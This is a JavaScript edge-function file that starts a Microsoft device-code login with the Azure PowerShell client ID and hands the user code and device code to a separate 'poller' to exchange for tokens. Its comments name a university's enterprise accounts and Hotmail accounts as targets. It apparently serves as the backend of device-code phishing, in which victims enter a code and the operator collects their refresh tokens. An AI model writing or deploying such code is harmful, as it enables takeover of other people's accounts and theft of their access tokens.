export const config = { runtime: 'edge' };

export default async function handler(req) {
  /**
   * THE UNIVERSAL KEY: Microsoft Azure PowerShell
   * ID: 1950a258-227b-4e31-a9cf-717495945fc2
   * This ID is pre-authorized for the 'common' endpoint and works for 
   * both SNHU (Enterprise) and Hotmail (Consumer) accounts.
   */
  const POWERSHELL_ID = "1950a258-227b-4e31-a9cf-717495945fc2";

  try {
    const response = await fetch("https://login.microsoftonline.com/common/oauth2/v2.0/devicecode", {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: new URLSearchParams({
        client_id: POWERSHELL_ID,
        // Using 'user_impersonation' which is the default for this App ID
        scope: "openid profile offline_access https://graph.microsoft.com/User.Read" 
      }),
    });

    const data = await response.json();

    if (data.error) {
        console.error("Microsoft Error:", data.error_description);
        return new Response(JSON.stringify(data), { status: 400 });
    }

    // Return the POWERSHELL_ID so the poller swaps the code correctly
    return new Response(JSON.stringify({ 
      user_code: data.user_code, 
      device_code: data.device_code,
      client_id: POWERSHELL_ID 
    }), {
      status: 200,
      headers: { 'Content-Type': 'application/json' }
    });

  } catch (err) {
    return new Response(JSON.stringify({ error: 'Engine Connection Failure' }), { status: 502 });
  }
}
